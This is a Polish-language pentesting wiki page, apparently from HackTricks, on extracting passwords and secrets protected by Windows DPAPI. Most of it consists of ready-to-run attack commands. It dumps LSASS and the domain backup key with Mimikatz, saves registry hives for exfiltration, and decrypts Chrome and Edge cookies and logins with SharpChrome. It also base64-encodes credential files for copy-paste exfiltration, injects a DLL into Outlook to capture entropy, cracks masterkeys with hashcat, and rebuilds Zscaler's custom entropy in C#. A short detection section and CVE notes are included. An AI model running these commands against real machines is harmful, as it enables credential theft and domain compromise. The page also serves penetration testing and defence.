# DPAPI - Wyodrębnianie haseł

{{#include ../../banners/hacktricks-training.md}}



## Czym jest DPAPI

Data Protection API (DPAPI) jest wykorzystywane głównie w systemie operacyjnym Windows do **symetrycznego szyfrowania asymetrycznych kluczy prywatnych**, przy użyciu sekretów użytkownika lub systemu jako istotnego źródła entropii. Takie podejście upraszcza szyfrowanie dla programistów, umożliwiając im szyfrowanie danych za pomocą klucza pochodzącego z sekretów logowania użytkownika lub — w przypadku szyfrowania systemowego — z sekretów uwierzytelniających systemu w domenie. Dzięki temu programiści nie muszą samodzielnie zarządzać ochroną klucza szyfrującego.

Najczęściej DPAPI używa się za pomocą funkcji **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom szyfrować i deszyfrować dane w kontekście zabezpieczeń aktualnie zalogowanego procesu. Domyślnie dane może odszyfrować tylko ten sam użytkownik lub kontekst systemowy, który je zaszyfrował.<sup>[[2]](#references)[[3]](#references)</sup>

Funkcje te przyjmują również opcjonalny **parametr entropii**, używany podczas szyfrowania i deszyfrowania. Do odszyfrowania danych zabezpieczonych przy użyciu opcjonalnej entropii potrzebna jest ta sama wartość entropii.<sup>[[2]](#references)[[6]](#references)</sup>

### Generowanie klucza użytkownika

DPAPI wyprowadza wartość specyficzną dla użytkownika (często nazywaną **pre-key**) z poświadczeń użytkownika. Dokładny sposób jej wyprowadzenia zależy od konta i wersji systemu operacyjnego. Na przykład Impacket wykorzystuje ścieżkę HMAC-SHA1 opartą na skrócie SHA-1 hasła w formacie UTF-16LE, inną ścieżkę opartą na skrócie MD4/NT hasła oraz ścieżkę PBKDF2-SHA256 dla Protected Users. Dlatego narzędzia offline często mogą wyprowadzić wymagany materiał zarówno ze zwykłego hasła, jak i z dostępnego skrótu NT.<sup>[[2]](#references)[[10]](#references)</sup>

Jest to szczególnie interesujące, ponieważ jeśli atakujący uzyska skrót hasła użytkownika, może:

- **Odszyfrować dowolne dane zaszyfrowane za pomocą DPAPI** przy użyciu klucza tego użytkownika, bez konieczności kontaktowania się z jakimkolwiek API
- Spróbować **złamać hasło** offline, aby wygenerować prawidłowy klucz DPAPI

DPAPI przechowuje jeden lub więcej **master keys** dla każdego użytkownika, zamiast tworzyć nowy master key dla każdego chronionego bloba. Każdy master key ma **GUID** (Globally Unique Identifier), a zaszyfrowany blob zawiera informację, który master key go chroni.<sup>[[2]](#references)</sup>

Master keys są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` to identyfikator zabezpieczeń użytkownika (Security Identifier). Plik master key zawiera materiał chroniony przez **pre-key** użytkownika oraz, w przypadku użytkowników domeny, materiał odzyskiwania chroniony przez **domain backup key**.<sup>[[2]](#references)</sup>

Pamiętaj, że **klucz domeny używany do szyfrowania master key znajduje się na kontrolerach domeny i nigdy się nie zmienia**, więc jeśli atakujący uzyska dostęp do kontrolera domeny, może pobrać domain backup key i odszyfrować master keys wszystkich użytkowników w domenie.<sup>[[2]](#references)</sup>

Zaszyfrowane bloby zawierają w nagłówkach **GUID master key**, który został użyty do zaszyfrowania zawartych w nich danych.

> [!TIP]
> Zaszyfrowane bloby DPAPI zaczynają się od **`01 00 00 00`**

Znajdź master keys:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Tak będzie wyglądać zestaw kluczy głównych użytkownika:

![Czym jest DPAPI — generowanie kluczy użytkownika: Tak będzie wyglądać zestaw kluczy głównych użytkownika](<../../images/image (1121).png>)

### Generowanie klucza komputera/systemu

Jest to klucz używany przez komputer do szyfrowania danych. Bazuje na **sekrecie LSA DPAPI_SYSTEM**, czyli specjalnym kluczu, do którego dostęp ma tylko użytkownik SYSTEM. Służy do szyfrowania danych, które muszą być dostępne dla samego systemu, takich jak dane uwierzytelniające na poziomie komputera lub sekrety całego systemu.<sup>[[2]](#references)</sup>

Pamiętaj, że te klucze **nie mają kopii zapasowej w domenie**, więc są dostępne tylko lokalnie:

- **Mimikatz** może uzyskać do nich dostęp, zrzucając sekrety LSA za pomocą polecenia: `mimikatz lsadump::secrets`
- Sekret jest przechowywany w rejestrze, więc administrator może **zmienić uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka w rejestrze: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Możliwa jest też ekstrakcja offline z uli rejestru. Na przykład administrator na celu może zapisać ule i je eksfiltrować:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Następnie na maszynie analitycznej odzyskaj sekret LSA DPAPI_SYSTEM z hive'ów i użyj go do odszyfrowania obiektów DPAPI chronionych w zakresie maszyny (na przykład poświadczeń aplikacji chronionych przez maszynę lub profili Wi-Fi):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Przykład DPAPI specyficzny dla Veeam:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Dane chronione przez DPAPI

Do danych osobowych chronionych przez DPAPI należą:

- Windows creds
- Hasła i dane autouzupełniania w Internet Explorerze i Google Chrome
- Hasła do kont e-mail i wewnętrznych kont FTP używanych przez aplikacje takie jak Outlook i Windows Mail
- Hasła do folderów udostępnionych, zasobów, sieci bezprzewodowych i Windows Vault, w tym klucze szyfrujące
- Hasła do połączeń pulpitu zdalnego, .NET Passport oraz klucze prywatne wykorzystywane do różnych celów związanych z szyfrowaniem i uwierzytelnianiem
- Hasła sieciowe zarządzane przez Credential Manager oraz dane osobowe w aplikacjach korzystających z CryptProtectData, takich jak Skype, MSN Messenger i inne
- Zaszyfrowane bloby w rejestrze
- ...

Dane systemowe chronione przez DPAPI obejmują:
- Hasła do Wi-Fi
- ...

Hasła zaplanowanych zadań to odrębna kwestia dotycząca LSA secrets. Zadanie zarejestrowane z [typem logowania Password](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) może przechowywać hasło umożliwiające odzyskanie dostępu jako lokalny administrator/SYSTEM; zadanie typu S4U lub korzystające z interaktywnego tokenu nie oznacza, że hasło zostało zapisane. Podmiot zabezpieczeń zadania i jego typ logowania są lepszymi wskaźnikami niż sama nazwa konta używanego do uruchamiania.

### Opcje ekstrakcji klucza głównego

- Jeśli użytkownik ma uprawnienia administratora domeny, może uzyskać dostęp do **klucza kopii zapasowej domeny**, aby odszyfrować wszystkie klucze główne użytkowników w domenie:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Mając lokalne uprawnienia administratora, można **uzyskać dostęp do pamięci LSASS**, aby wyodrębnić główne klucze DPAPI wszystkich zalogowanych użytkowników oraz klucz SYSTEM.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Jeśli użytkownik ma uprawnienia lokalnego administratora, może uzyskać dostęp do **DPAPI_SYSTEM LSA secret**, aby odszyfrować główne klucze maszyny:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Jeśli hasło lub hash NTLM użytkownika jest znany, możesz **bezpośrednio odszyfrować klucze główne użytkownika**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Jeśli jesteś zalogowany w sesji jako użytkownik, możesz poprosić DC o **klucz zapasowy do odszyfrowania kluczy głównych przez RPC**. Jeśli masz lokalne uprawnienia administratora, a użytkownik jest zalogowany, możesz **ukraść jego token sesji**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Wylistuj Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Dostęp do zaszyfrowanych danych DPAPI

### Znajdowanie zaszyfrowanych danych DPAPI

Typowe pliki użytkowników chronione przez DPAPI znajdują się w:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Sprawdź również powyższe ścieżki, zamieniając `\Roaming\` na `\Local\`.

Przykłady enumeracji:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) może znaleźć zaszyfrowane DPAPI bloby w systemie plików, rejestrze i blobach B64:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Zauważ, że [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (z tego samego repozytorium) może służyć do odszyfrowywania wrażliwych danych, takich jak cookies, przy użyciu DPAPI.<sup>[[12]](#references)</sup>

#### Szybkie przepisy dla Chromium/Edge/Electron (SharpChrome)

- Bieżący użytkownik, interaktywne odszyfrowywanie zapisanych loginów/cookies (działa również z cookies app-bound w Chrome 127+, ponieważ dodatkowy klucz jest pobierany z Credential Manager użytkownika, gdy polecenie jest uruchamiane w kontekście użytkownika):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Analiza offline, gdy masz tylko pliki. Najpierw wyodrębnij klucz stanu AES z pliku „Local State” profilu, a następnie użyj go do odszyfrowania bazy danych cookies:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Analiza w skali całej domeny/zdalna, gdy masz klucz kopii zapasowej domeny DPAPI (PVK) i uprawnienia administratora na hoście docelowym:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Jeśli masz klucz wstępny/klucz poświadczeń DPAPI użytkownika (z LSASS), możesz pominąć łamanie hasła i bezpośrednio odszyfrować dane profilu:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Uwagi
- Nowsze wersje Chrome/Edge mogą przechowywać niektóre cookies z użyciem szyfrowania „App-Bound”. Odszyfrowanie tych konkretnych cookies offline nie jest możliwe bez dodatkowego klucza app-bound; uruchom SharpChrome w kontekście docelowego użytkownika, aby automatycznie go pobrać. Zobacz wpis na blogu Chrome dotyczącym bezpieczeństwa, do którego link znajduje się poniżej.<sup>[[5]](#references)</sup>

### Klucze dostępu i dane

- **Użyj SharpDPAPI**, aby pobrać dane uwierzytelniające z plików zaszyfrowanych za pomocą DPAPI w bieżącej sesji:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Pobierz informacje o poświadczeniach**, takie jak zaszyfrowane dane i guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Uzyskaj dostęp do masterkeys**:

Odszyfruj masterkey użytkownika żądającego **domain backup key** za pomocą RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Narzędzie **SharpDPAPI** obsługuje też te argumenty do odszyfrowywania masterkey (zwróć uwagę, że można użyć `/rpc`, aby pobrać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci jawnego tekstu, lub `/pvk`, aby wskazać plik z prywatnym kluczem DPAPI domeny...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Odszyfruj dane za pomocą masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Narzędzie **SharpDPAPI** obsługuje również te argumenty do deszyfrowania `credentials|vaults|rdg|keepass|triage|blob|ps` (zwróć uwagę, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci zwykłego tekstu, `/pvk`, aby wskazać plik klucza prywatnego DPAPI domeny, oraz `/unprotect`, aby użyć bieżącej sesji użytkownika...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Using DPAPI prekey/credkey directly (no password needed)

Jeśli możesz zrzucić LSASS, Mimikatz często udostępnia klucz DPAPI przypisany do logowania, którego można użyć do odszyfrowania masterkeys użytkownika bez znajomości hasła w postaci jawnej. Przekaż tę wartość bezpośrednio do narzędzia:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Odszyfruj część danych przy użyciu **bieżącej sesji użytkownika**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Offline decryption with Impacket dpapi.py

Jeśli masz SID i hasło użytkownika ofiary (lub NT hash), możesz całkowicie offline odszyfrować masterkeys DPAPI i bloby Credential Manager za pomocą dpapi.py z Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Zidentyfikuj artefakty na dysku:
  - Bloby Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
  - Pasujący masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Jeśli narzędzie do transferu plików działa niestabilnie, zakoduj pliki na hoście w base64 i skopiuj wynik:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Odszyfruj masterkey przy użyciu SID użytkownika i hasła/hashu:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Użyj odszyfrowanego masterkey do odszyfrowania blobu poświadczeń:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Ten workflow często odzyskuje poświadczenia domenowe zapisane przez aplikacje za pomocą Windows Credential Manager, w tym konta administracyjne (np. `*_adm`).

---

### Obsługa opcjonalnej entropii („Third-party entropy”)

Niektóre aplikacje przekazują dodatkową wartość **entropii** do `CryptProtectData`. Bez tej wartości nie można odszyfrować blobu, nawet jeśli znany jest prawidłowy masterkey. Dlatego uzyskanie entropii jest niezbędne przy atakowaniu poświadczeń chronionych w ten sposób (np. Microsoft Outlook, niektóre klienty VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) to DLL działająca w trybie użytkownika, która przechwytuje funkcje DPAPI wewnątrz procesu docelowego i w sposób przezroczysty zapisuje przekazaną opcjonalną entropię. Uruchomienie EntropyCapture w trybie **DLL-injection** przeciwko procesom takim jak `outlook.exe` lub `vpnclient.exe` powoduje wygenerowanie pliku mapującego każdy bufor entropii na wywołujący proces i blob. Przechwyconą entropię można później przekazać do **SharpDPAPI** (`/entropy:`) lub **Mimikatz** (`/entropy:<file>`), aby odszyfrować dane.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft wprowadził format masterkey **context 3** w systemie Windows 10 v1607 (2016). W `hashcat` v6.2.6 (grudzień 2023) dodano tryby hash **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), umożliwiające łamanie haseł użytkowników bezpośrednio z pliku masterkey z użyciem GPU. Atakujący mogą więc przeprowadzać ataki word-list lub brute-force bez interakcji z systemem docelowym.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatyzuje ten proces:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Narzędzie może również parsować bloby Credential i Vault, odszyfrowywać je za pomocą złamanych kluczy i eksportować hasła w postaci jawnego tekstu.<sup>[[8]](#references)</sup>


### Dostęp do danych innej maszyny

W **SharpDPAPI i SharpChrome** możesz użyć opcji **`/server:HOST`**, aby uzyskać dostęp do danych zdalnej maszyny. Oczywiście musisz mieć do niej dostęp, a w poniższym przykładzie zakładamy, że **znany jest klucz szyfrujący kopii zapasowej domeny**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## Inne narzędzia

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie automatyzujące pobieranie wszystkich użytkowników i komputerów z katalogu LDAP oraz pobieranie klucza kopii zapasowej kontrolera domeny przez RPC. Skrypt następnie rozwiązuje adresy IP wszystkich komputerów i wykonuje smbclient na każdym z nich, aby pobrać wszystkie bloby DPAPI wszystkich użytkowników i odszyfrować je za pomocą klucza kopii zapasowej domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Lista komputerów pobrana z LDAP pozwala znaleźć każdą podsieć, nawet jeśli wcześniej o niej nie wiedziałeś!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) może automatycznie zrzucać sekrety chronione przez DPAPI. Wersja 2.x wprowadziła:<sup>[[9]](#references)</sup>

* Równoległe zbieranie blobów z setek hostów
* Parsowanie kluczy głównych **context 3** i automatyczną integrację z łamaniem haseł Hashcat
* Obsługę zaszyfrowanych plików cookie Chrome „App-Bound” (zobacz następną sekcję)
* Nowy tryb **`--snapshot`** do wielokrotnego odpytywania endpointów i porównywania nowo utworzonych blobów 

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser w C# plików masterkey/credential/vault, który może generować formaty Hashcat/JtR i opcjonalnie automatycznie uruchamiać łamanie haseł. W pełni obsługuje formaty kluczy głównych maszyn i użytkowników aż do Windows 11 24H1.<sup>[[8]](#references)</sup>


## Typowe wykrycia

- Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i innych katalogach związanych z DPAPI.
    - Szczególnie z udziału sieciowego, takiego jak **C$** lub **ADMIN$**.
- Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do uzyskania dostępu do pamięci LSASS lub zrzucenia kluczy głównych.
- Zdarzenie **4662**: *Wykonano operację na obiekcie* – można je skorelować z dostępem do obiektu **`BCKUPKEY`**.
- Zdarzenie **4673/4674**, gdy proces żąda uprawnienia *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Luki w zabezpieczeniach i zmiany w ekosystemie w latach 2023–2025

* **CVE-2023-36004 – podszywanie się pod bezpieczny kanał Windows DPAPI** (listopad 2023). Atakujący z dostępem do sieci mógł nakłonić członka domeny do pobrania złośliwego klucza kopii zapasowej DPAPI, umożliwiając odszyfrowanie kluczy głównych użytkowników. Luka została załatana w zbiorczej aktualizacji z listopada 2023 r. Administratorzy powinni upewnić się, że kontrolery domeny i stacje robocze mają zainstalowane wszystkie aktualizacje zabezpieczeń.<sup>[[4]](#references)</sup>
* **Szyfrowanie plików cookie „App-Bound” w Chrome 127** (lipiec 2024) zastąpiło starszą ochronę opartą wyłącznie na DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Odszyfrowanie plików cookie w trybie offline wymaga teraz zarówno klucza głównego DPAPI, jak i **klucza app-bound opakowanego GCM**. SharpChrome v2.3 i DonPAPI 2.x mogą odzyskać dodatkowy klucz, gdy działają w kontekście użytkownika.<sup>[[5]](#references)</sup>


### Studium przypadku: Zscaler Client Connector – niestandardowa entropia wyprowadzana z SID

Zscaler Client Connector przechowuje kilka plików konfiguracyjnych w `C:\ProgramData\Zscaler` (np. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Każdy plik jest szyfrowany przez **DPAPI (zakres komputera)**, ale dostawca używa **niestandardowej entropii**, która jest *obliczana w czasie działania*, zamiast być przechowywana na dysku.<sup>[[1]](#references)</sup>

Entropia jest odtwarzana na podstawie dwóch elementów:

1. Sekretu zakodowanego na stałe w pliku `ZSACredentialProvider.dll`.
2. **SID** konta Windows, do którego należy konfiguracja.

Algorytm zaimplementowany w DLL jest równoważny:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Ponieważ sekret jest osadzony w DLL, którą można odczytać z dysku, **każdy lokalny atakujący z uprawnieniami SYSTEM może ponownie wygenerować entropię dla dowolnego SID** i odszyfrować bloby offline:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Odszyfrowanie ujawnia kompletną konfigurację JSON, w tym wszystkie **kontrole stanu urządzenia** i oczekiwane dla nich wartości – informacje bardzo przydatne przy próbach obejścia zabezpieczeń po stronie klienta.

> WSKAZÓWKA: pozostałe zaszyfrowane artefakty (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) są chronione za pomocą DPAPI **bez** entropy (16 bajtów o wartości zero). Można je więc odszyfrować bezpośrednio za pomocą `ProtectedData.Unprotect` po uzyskaniu uprawnień SYSTEM.

## References

- [1] [Synacktiv – Czy należy ufać zero trust? Omijanie kontroli stanu Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Sekrety DPAPI. Analiza bezpieczeństwa i odzyskiwanie danych w DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Odczytywanie zaszyfrowanych sekretów DPAPI za pomocą Mimikatz i C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 – podatność Windows DPAPI (Data Protection Application Programming Interface) typu spoofing](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Zwiększanie bezpieczeństwa plików cookie Chrome w systemie Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: proste wyodrębnianie opcjonalnego entropy DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Informacje o wydaniu hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – repozytorium GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – strona projektu w PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: nadużywanie AD ACL, łamanie Argon2 KeePassXC i odszyfrowywanie DPAPI w celu uzyskania uprawnień administratora DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – użycie i opcje](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
